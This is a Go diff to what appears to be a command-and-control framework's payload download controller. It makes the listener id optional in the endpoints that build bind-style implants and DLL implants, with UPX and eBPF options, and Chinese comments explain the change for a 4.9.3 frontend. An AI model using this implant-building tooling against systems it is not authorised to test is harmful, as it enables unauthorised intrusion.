@@ -125,19 +125,20 @@ func (c *DownloadController) Listen() {
 	salt := c.JsonGetStr("salt")
 	upx := c.JsonGetBool("upx")
 	ebpf := c.JsonGetBool("ebpf")
-	if id == 0 {
-		c.JsonErr("id is null")
-		return
-	}
+	// 4.9.3 的正向客户端前端只传 arch/tp/host/port/vkey/salt/upx（不带 id），
+	// 所以这里 id 可选：给了就用监听器的盐与地址兜底，没给就按参数直接构建。
 	if host == "" || port == 0 {
 		c.JsonErr("host and port required")
 		return
 	}
 
-	l := c2engine.GetEngine().GetListener(id)
-	if l == nil {
-		c.JsonErr("not found")
-		return
+	var l *c2engine.Listener
+	if id != 0 {
+		l = c2engine.GetEngine().GetListener(id)
+		if l == nil {
+			c.JsonErr("not found")
+			return
+		}
 	}
 
 	c.servePoDownload(c2engine.PoListenBuild(l, host, port, tp, arch, vkey, salt, upx, ebpf))
@@ -237,19 +238,20 @@ func (c *DownloadController) ListenDll() {
 		return
 	}
 
-	if id == 0 {
-		c.JsonErr("id is null")
-		return
-	}
 	if host == "" || port == 0 {
 		c.JsonErr("host and port required")
 		return
 	}
 
-	l := c2engine.GetEngine().GetListener(id)
-	if l == nil {
-		c.JsonErr("not found")
-		return
+	// 4.9.3 的正向客户端前端只传 arch/tp/host/port/vkey/salt/upx（不带 id），
+	// 因此 id 可选：给了就取监听器兜底盐，没给就按参数直接构建。
+	var l *c2engine.Listener
+	if id != 0 {
+		l = c2engine.GetEngine().GetListener(id)
+		if l == nil {
+			c.JsonErr("not found")
+			return
+		}
 	}
 
 	c.servePoDownload(c2engine.PoListenDllBuild(l, host, port, tp, arch, vkey, salt, upx))
